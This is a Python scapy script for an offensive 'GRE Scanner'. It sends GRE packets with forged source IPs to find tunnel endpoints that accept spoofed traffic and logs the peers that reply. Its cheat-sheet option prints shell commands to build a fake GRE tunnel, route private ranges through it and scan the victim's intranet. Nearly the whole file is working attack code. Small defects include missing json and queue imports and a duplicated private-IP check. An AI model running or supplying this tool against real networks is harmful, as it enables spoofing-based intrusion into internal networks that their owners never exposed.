from scapy.all import *
import socket
import struct
import time
import threading, ctypes
import ipaddress
import logging
import argparse
import multiprocessing
import os
import itertools
from queue import Queue
from netaddr import IPSet

# setting
STAUTS_FILENAME = ".grescanner.status"

# 設置logger
logger = logging.getLogger('GRE Scanner')
console_handler = logging.StreamHandler()
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
console_handler.setFormatter(formatter)
logger.addHandler(console_handler)

def read_ip_list_from_file(filepath):
    with open(filepath, 'r') as file:
        return [line.strip() for line in file if line.strip()]



def is_valid_subnet(subnet_str):
    try:
        # This will check if the subnet string is a valid IPv4 network
        ipaddress.IPv4Network(subnet_str, strict=False)
        return True
    except ValueError:
        return False
def generate_ip_list(network):
    try:
        net = ipaddress.ip_network(network, strict=False)
        for ip in net:
            yield str(ip)
    except ValueError:
        yield network

def generate_ips_from_source(src_networks):
    if os.path.isfile(src_networks):
        logger.debug(f"Reading source networks from file: {src_networks}")
        for network in read_ip_list_from_file(src_networks):
            yield from generate_ip_list(network)
    else:
        logger.debug(f"Generating source IPs from network: {src_networks}")
        yield from generate_ip_list(src_networks)

def generate_ips_from_destination(dst_networks):
    if os.path.isfile(dst_networks):
        logger.debug(f"Reading destination networks from file: {dst_networks}")
        for network in read_ip_list_from_file(dst_networks):
            yield from generate_ip_list(network)
    else:
        logger.debug(f"Generating destination IPs from network: {dst_networks}")
        yield from generate_ip_list(dst_networks)

def identifier_sequence_to_ip(identifier, sequence):
    ip_int = (identifier << 16) | sequence
    ip = socket.inet_ntoa(struct.pack("!I", ip_int))
    return ip

def handle_packet(packet):
    if ICMP in packet and packet[ICMP].type == 0:  # ICMP Echo Reply
        identifier = packet[ICMP].id
        sequence = packet[ICMP].seq
        original_ip = identifier_sequence_to_ip(identifier, sequence)
        logger.critical(f"Received reply from {packet[IP].src} GRE peer: {original_ip}")

def listen_for_icmp_replies(interface, src_ips, icmp_src_ip):
    src_ips.append(icmp_src_ip)
    ip_set = IPSet(src_ips)
    aggregated_ips = list(ip_set.iter_cidrs())
    # 生成 src_ips_filter
    src_ips_filter = " or ".join(f"src net {cidr}" for cidr in aggregated_ips)
    filter_rule = f"icmp and icmp[icmptype] == icmp-echoreply and ({src_ips_filter})"
    logger.debug(f"Listening on interface {interface} with filter: {filter_rule}")
    sniff(iface=interface, filter=filter_rule, prn=handle_packet)

        

def ip_to_identifier_sequence(ip):
    ip_int = struct.unpack("!I", socket.inet_aton(ip))[0]
    identifier = (ip_int >> 16) & 0xFFFF
    sequence = ip_int & 0xFFFF
    return identifier, sequence

def create_gre_packet(iface, gre_src_ip, gre_dst_ip, icmp_src_ip, icmp_dst_ip,use_reverse, isl3tunnel=False):
    identifier, sequence = ip_to_identifier_sequence(gre_src_ip)
    if use_reverse : 
        identifier, sequence = ip_to_identifier_sequence(gre_dst_ip)
    icmp_packet = IP(src=icmp_src_ip, dst=icmp_dst_ip) / ICMP(type=8, id=identifier, seq=sequence)
    gre_packet = IP(src=gre_src_ip, dst=gre_dst_ip) / GRE() / icmp_packet
    # gre_packet.show()
    logger.info(f'sending gresrc {gre_src_ip}, gredst {gre_dst_ip}')
    logger.debug(f'icmp src {icmp_src_ip}, icmp dst {icmp_dst_ip}')
    if isl3tunnel:
        sendp(gre_packet, iface=iface, verbose=False)
    else:
        send(gre_packet, verbose=False)

def generate_full_list(src_ips, dst_ips, do_private):
    for gre_src_ip in src_ips:
        for gre_dst_ip in dst_ips:
            if (is_private_ip(gre_src_ip) or is_private_ip(gre_src_ip)) and not do_private:
                continue
            yield {
                "gre_src_ip": gre_src_ip,
                "gre_dst_ip": gre_dst_ip
            }

def split_list_generator(full_list, chunk_size):
    chunk = []
    for item in full_list:
        chunk.append(item)
        if len(chunk) == chunk_size:
            yield chunk
            chunk = []
    if chunk:
        yield chunk
def worker(job_queue, iface, icmp_src_ip, internal_dst, isl3tunnel,use_reverse):
    while not job_queue.empty():
        try:
            job = job_queue.get_nowait()
        except queue.Empty:
            break

        if internal_dst:
            create_gre_packet(iface, job['gre_src_ip'], job['gre_dst_ip'], icmp_src_ip, internal_dst, use_reverse,isl3tunnel=isl3tunnel,)
        else:
            create_gre_packet(iface, job['gre_src_ip'], job['gre_dst_ip'], icmp_src_ip, job['gre_dst_ip'],use_reverse,isl3tunnel=isl3tunnel)
        job_queue.task_done()

def parse_ip_input(input_value):
    """Parse the input which can be an IP, a subnet, or a file containing IPs/subnets."""
    if os.path.isfile(input_value):
        with open(input_value, 'r') as file:
            lines = file.read().splitlines()
            return [ipaddress.ip_network(line.strip(), strict=False) for line in lines]
    else:
        return [ipaddress.ip_network(input_value, strict=False)]

def is_private_ip(ip_str):
    """Check if the given IP address is in the private subnets."""
    private_subnets = [
        '0.0.0.0/8',
        '10.0.0.0/8',
        '100.64.0.0/10',
        '127.0.0.0/8',
        '169.254.0.0/16',
        '172.16.0.0/12',
        '192.0.2.0/24',
        '192.88.99.0/24',
        '192.168.0.0/16',
        '198.18.0.0/15',
        '198.51.100.0/24',
        '203.0.113.0/24',
        '224.0.0.0/4',
        '240.0.0.0/4'
    ]
    ip = ipaddress.ip_address(ip_str)
    return any(ip in ipaddress.ip_network(subnet, strict=False) for subnet in private_subnets)
global warning_private_flag
warning_private_flag = True 
def full_list_generator(src,dst, srcdst=None, chunk_size=100, use_private=False):
    chunk = []
    global warning_private_flag
    if srcdst :
        if os.path.isfile(srcdst):
            with open(srcdst, 'r') as file:
                lines = file.read().splitlines()
                for line in lines:
                    try:
                        src_ip, dst_ip = line.split(',')
                    except:
                        parser.error("--src-dst-list file must be in the format 'src_ip,dst_ip'")
                    if not use_private and (is_private_ip(dst_ip) or is_private_ip(src_ip)):
                        if warning_private_flag:
                            warning_private_flag = False
                            logger.warning('found private ip and will not be scan (add -dp to force private ip scan)')
                        continue
                    chunk.append({
                        "gre_src_ip": src_ip,
                        "gre_dst_ip": dst_ip
                    })
                    if len(chunk) >= chunk_size:
                        yield chunk
                        chunk = []
        else:
         parser.error("--src-dst-list no a file.")   
    else:
        dst_networks = parse_ip_input(dst)
        src_networks = parse_ip_input(src)
        
        for src_network in src_networks:
            for src_ip in src_network:
                for dst_network in dst_networks:
                    for dst_ip in dst_network:
                        if not use_private and (is_private_ip(dst_ip) or is_private_ip(src_ip)):
                            if warning_private_flag:
                                warning_private_flag = False
                                logger.warning('found private ip and will not be scan (add -dp to force private ip scan)')
                            continue
                        chunk.append({
                            "gre_src_ip": str(src_ip),
                            "gre_dst_ip": str(dst_ip)
                        })
                        if len(chunk) >= chunk_size:
                            yield chunk
                            chunk = []
    
    # Yield any remaining items in the chunk
    if chunk:
        yield chunk


if __name__ == "__main__":
    #check root
    if os.geteuid() != 0:
        print("This script must be run as root!")
        sys.exit(1)
    # parse user input
    parser = argparse.ArgumentParser(description='GRE Scanner')
    parser.add_argument('-i', '--iface', required=True, help='Interface name')
    parser.add_argument('-lh', '--icmp-src-ip', required=True, help='ICMP source IP')
    parser.add_argument('-s', '--src-networks', required=False, help='Source networks')
    parser.add_argument('-d', '--dst-networks', required=False, help='Destination networks')
    parser.add_argument('-L', '--src-dst-list', required=False, help='A list of src and dst e.g. `$SRCADDR,2.2.2.2`')
    parser.add_argument('-t', '--wait-time', type=float, default=2, help='Wait time after gre package send (default: 2)')
    parser.add_argument('-T', '--thread', type=int, default=100, help='How many thread to send (default: 100)')
    parser.add_argument('-cs', '--chunk-size', type=int, default=900, help='How many ip wait for ping to responsed (default: 900)')
    parser.add_argument('-l3', '--isl3tunnel', action='store_true', default=False, help='Is interface a L3 tunnel (default: False)')
    parser.add_argument('-r', '--reverse', action='store_true', default=False, help='ICMP info send GRE dst IP (usually use woth -id flag) (default: False)')
    parser.add_argument('-sch', '--show-cheat-sheet', action='store_true', default=False, help='Show how to fake GRE tunnel (default: False)')
    parser.add_argument('-ss', '--save-status', action='store_true', default=False, help='save scan status, if status file exist continue the scan (default: False)')
    parser.add_argument('-dp', '--do-private', action='store_true', default=False, help='Dont bypass private IPs (default: False)')
    parser.add_argument('-o', '--outfile', help='Output file (default: None)')
    parser.add_argument('-id', '--internal-dst', help='Internal ICMP dst IP (default: same as GRE dst)')
    parser.add_argument('-gw', '--gateway',default=None,  help='your l2 network gateway (for cheat sheet only)')
    parser.add_argument('-v', '--loglevel', default='INFO', help='Set logging level (default: INFO)',
                        choices=['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'])

    args = parser.parse_args()

    iface = args.iface
    icmp_src_ip = args.icmp_src_ip
    src_networks = args.src_networks
    dst_networks = args.dst_networks
    src_dst_list = args.src_dst_list
    wait_time = args.wait_time
    isl3tunnel = args.isl3tunnel
    outfile = args.outfile
    internal_dst = args.internal_dst
    do_private = args.do_private
    max_threads = args.thread
    CHUNK_SIZE = args.chunk_size
    use_reverse = args.reverse
    save_status = args.save_status
    gateway = args.gateway

    if args.show_cheat_sheet:
        cheatsheet = f'''\
#### Create Fake Tunnel ####
IFACE={iface}
MYPUBIP={icmp_src_ip}
SRCADDR={src_networks}
DSTADDR={dst_networks}
ip addr add $SRCADDR/32 dev $IFACE
'''
        if not isl3tunnel:
            if not gateway:
                cheatsheet += 'GATEWAY=1.2.3.4 #change this if not l3'
            else:
                cheatsheet += f'GATEWAY={gateway}'
            cheatsheet += '\nip r add $DSTADDR dev $IFACE via $GATEWAY src $SRCADDR'
        else:
            cheatsheet += 'ip r add $DSTADDR dev $IFACE src $SRCADDR'
        cheatsheet += f'''
ip tunnel add gre1 mode gre local $SRCADDR remote $DSTADDR ttl 255
ip link set gre1 up mtu 1280

## route possible private ip ##
ip r add 10.0.0.0/8 dev gre1 src $MYPUBIP
ip r add 172.16.0.0/12 dev gre1 src $MYPUBIP
ip r add 192.168.0.0/16 dev gre1 src $MYPUBIP

### start scan intranet ###
#### !IMPORTANT! ####
# !! nmap is not available for this kind of attack use fping instead !! #
# fping -g 192.168.0.0/16 2>/dev/null

### cleanup ###
ip addr del $SRCADDR/32 dev $IFACE
ip tunnel del gre1'''
        print(cheatsheet)
        exit()

    if not src_dst_list and (not dst_networks or not src_networks):
        parser.error("At least --src-dst-list or (--src-networks and --dst-networks) must be specified.")

    # Set logger level
    logger.setLevel(getattr(logging, args.loglevel))
    
    # If outfile is set
    if outfile:
        file_handler = logging.FileHandler(outfile)
        file_handler.setFormatter(formatter)
        logger.addHandler(file_handler)
    status_data = None
    canStart = True
    if save_status:
        logger.warning("-ss option is on Please ensure every scan are in different folder")
        try: 
            with open(STAUTS_FILENAME, 'r') as file:
                status_data = json.load(file)
                status_data['gre_src_ip'] 
                status_data['gre_dst_ip']
                logger.info(f"Data has been load")
                canStart = False
        except:
            logger.warning("No status file found new scan")
    # main start
    for one_time in full_list_generator(src_networks,dst_networks,srcdst=src_dst_list,chunk_size=CHUNK_SIZE,use_private=do_private):
        if status_data and not canStart:
            for check in one_time:
                if check['gre_src_ip'] == status_data['gre_src_ip'] and check['gre_dst_ip'] == status_data['gre_dst_ip'] :
                    canStart = True
            continue
        one_time = list(one_time)  # Force evaluation of generator
        unique_dst_ips = list(set(item["gre_dst_ip"] for item in one_time))
        # start the listener wait ping
        
        if internal_dst:
            unique_dst_ips.append(internal_dst)
        sniffer_dead_count=0
        while True:
            needrestartflag = False
            listener_thread = multiprocessing.Process(target=listen_for_icmp_replies, args=(iface, unique_dst_ips, icmp_src_ip))

            listener_thread.start()
            time.sleep(0.5)
            # check sniffer is alive
            if not listener_thread.is_alive():
                logger.warning("sniffer dead "+ str(sniffer_dead_count) +" time rerun task (If you keep seeing this you have to lower the -cs)")
                sniffer_dead_count+=1
                if sniffer_dead_count > 5:
                    logger.error("sniffer dead 5 time exit()")
                    exit()
                continue # or restart sniffer

            job_queue = multiprocessing.JoinableQueue()

            for job in one_time:
                job_queue.put(job)

            processes = []
            for _ in range(max_threads):
                p = multiprocessing.Process(target=worker, args=(job_queue, iface, icmp_src_ip, internal_dst, isl3tunnel,use_reverse))
                processes.append(p)
                p.start()

            job_queue.join()
            
            for p in processes:
                p.join(timeout=2) 
                # if process not send within sec means bad
                if p.is_alive():
                    needrestartflag = True
                    logger.warning("Worker is still running. Terminating...")
                    p.terminate()
                    p.join() 

            logger.debug('Wait timeout from ping for ' + str(wait_time) + ' sec')
            time.sleep(wait_time)
            
            if not listener_thread.is_alive() or needrestartflag:
                logger.warning("sniffer dead "+ str(sniffer_dead_count) +" time rerun task (If you keep seeing this you have to lower the -cs)")
                sniffer_dead_count+=1
                if sniffer_dead_count > 5:
                    logger.error("sniffer dead 5 time exit()")
                    exit()
                continue
            logger.debug("Listener stop")
            listener_thread.terminate()
            if save_status :
                with open(STAUTS_FILENAME, 'w') as file:
                    json.dump(one_time[-1], file)
            break
    if save_status:
        logger.info("scan complete remove state file")
        os.remove(STAUTS_FILENAME)
